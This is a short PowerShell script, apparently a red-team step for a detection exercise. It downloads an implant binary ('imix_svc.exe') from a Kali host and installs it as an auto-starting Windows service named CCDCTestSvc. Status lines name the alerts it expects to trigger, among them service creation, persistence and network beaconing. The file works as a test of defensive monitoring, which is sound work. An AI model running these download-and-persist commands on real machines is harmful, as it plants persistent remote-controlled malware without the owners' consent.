param([Parameter(Mandatory=$true)][string]$Kali, [int]$Port = 8000)
Write-Host "[1] pulling service build..."
IWR "http://${Kali}:${Port}/imix_svc.exe" -OutFile C:\Users\Public\imix_svc.exe
Write-Host "[2] creating + starting service (expect EVT-7045 then PERS-SERVICE)..."
sc.exe create CCDCTestSvc binPath= "C:\Users\Public\imix_svc.exe" start= auto
sc.exe start CCDCTestSvc
Write-Host "auditor diff fires within 30s; NET-BEACON after ~1-2 min"
